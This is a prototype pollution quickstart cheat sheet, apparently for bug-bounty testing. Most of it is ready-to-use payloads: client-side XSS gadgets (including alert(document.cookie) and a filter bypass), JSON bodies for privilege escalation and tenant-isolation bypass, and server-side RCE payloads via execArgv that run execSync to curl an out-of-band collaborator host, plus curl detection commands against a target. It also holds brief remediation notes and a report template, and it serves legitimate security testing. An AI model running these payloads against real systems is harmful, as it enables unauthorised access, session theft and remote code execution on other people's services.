# Prototype Pollution Quickstart

For comprehensive coverage see `scenarios/prototype-pollution/`. The original cheat sheet has been split into per-topic scenarios.

## 60-second checks

### Client-side
```javascript
// Add to URL: ?__proto__[test]=vulnerable
// Then in DevTools console:
Object.prototype.test  // "vulnerable" → VULNERABLE
```

### Server-side
```bash
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"json spaces": 10}}'
# Increased indentation in response → VULNERABLE
```

## Common payloads

### Client-side XSS
```
?__proto__[transport_url]=data:,alert(1);
?__proto__[value]=data:,alert(document.domain);
?__pro__proto__to__[transport_url]=data:,alert(1);     # filter bypass
#__proto__[hitCallback]=alert(document.cookie)         # hash-based
?constructor[prototype][transport_url]=data:,alert(1); # alternative
```

### Server-side privilege escalation
```json
{"__proto__":{"isAdmin": true}}
{"__proto__":{"role":"admin","privilegeLevel":999}}
```

### Server-side RCE
```json
// Detection
{"__proto__":{"json spaces": 10}}
{"__proto__":{"status": 555}}

// RCE via execArgv
{"__proto__":{"execArgv":["--eval=require('child_process').execSync('curl https://YOUR-COLLAB.oastify.com')"]}}

// RCE via vim shell
{"__proto__":{"shell":"vim","input":":! COMMAND\n"}}
```

## Burp speed tips

| Action | Shortcut |
|--------|----------|
| Send to Repeater | Ctrl+R |
| Send to Intruder | Ctrl+I |
| Pretty-print JSON | Ctrl+Shift+B |
| Open Collaborator | Ctrl+Shift+C |

DOM Invader workflow:
1. Burp built-in browser → DOM Invader → enable "Prototype pollution"
2. Navigate to target → "Scan for gadgets"
3. Select gadget → "Exploit"

## Detection commands

### Browser console
```javascript
(function() {
    const test = '__pptest_' + Math.random();
    window.location.search = '?__proto__[' + test + ']=1';
    setTimeout(() => console.log(Object.prototype[test] ? 'VULNERABLE' : 'SAFE'), 100);
})();
```

### cURL (server-side)
```bash
# JSON spaces — count indented lines
curl -s -X POST https://target.com/api -H "Content-Type: application/json" \
  -d '{"data":"x","__proto__":{"json spaces":10}}' | grep -c "          "

# Status code 555
curl -s -X POST https://target.com/api -H "Content-Type: application/json" \
  -w "\n%{http_code}\n" -d '{"__proto__":{"status":555}}'

# Property reflection
curl -s -X POST https://target.com/api -H "Content-Type: application/json" \
  -d '{"__proto__":{"pptest":"vulnerable"}}' | jq '.pptest'
```

## URL encoding

```
__proto__[test]=value  →  __proto__%5Btest%5D=value
< %3C    > %3E    " %22    ' %27    ( %28    ) %29
```

## Quick wins by app type

| Type | Target properties | Sample payload |
|------|-------------------|----------------|
| E-commerce / accounts | `isAdmin`, `isPremium`, `discountRate` | `{"__proto__":{"isAdmin":true,"discountRate":1.0}}` |
| SaaS / multi-tenant | `tenantId`, `organizationId`, `accessLevel` | `{"__proto__":{"tenantId":"victim","bypassIsolation":true}}` |
| API gateways | `rateLimit`, `authenticated`, `apiKey` | `{"__proto__":{"authenticated":true,"rateLimit":false}}` |
| CMS | `canEdit`, `canPublish`, `role` | `{"__proto__":{"canEdit":true,"role":"editor"}}` |

## 5-minute bug-bounty workflow

1. **Recon (2m)** — find JSON endpoints, query string parsing, client-side merges.
2. **Detect (1m)** — `?__proto__[test]=1` in URL, `{"__proto__":{"json spaces":10}}` in JSON body.
3. **Impact (2m)** — privilege bypass? XSS? RCE? Which gadgets exist?

Report template:
```markdown
## Prototype Pollution in [Endpoint]
**Severity:** High/Critical
**Type:** [CSPP XSS / SSPP RCE / Privilege Escalation]
### PoC
[payload + steps]
### Impact
[scenario]
### Remediation
- Allowlist property keys
- `Object.create(null)`
- `secure-json-parse` middleware
- Schema validation (`ajv`/`zod`)
```

## Where to go next

| Topic | Scenario file |
|-------|---------------|
| Detection methodology + scripts | `scenarios/prototype-pollution/detection.md` |
| CSPP (XSS gadgets) | `scenarios/prototype-pollution/client-side-pollution.md` |
| SSPP (privesc, RCE, Mongoose) | `scenarios/prototype-pollution/server-side-pollution.md` |
| Gadget discovery | `scenarios/prototype-pollution/gadget-discovery.md` |
| Filter / WAF bypass | `scenarios/prototype-pollution/bypass-techniques.md` |
| Tooling (cURL/Burp/DOM Invader) | `scenarios/prototype-pollution/testing-tools.md` |
| Prevention code | `scenarios/prototype-pollution/prevention.md` |
| External resources catalog | `prototype-pollution-resources.md` |
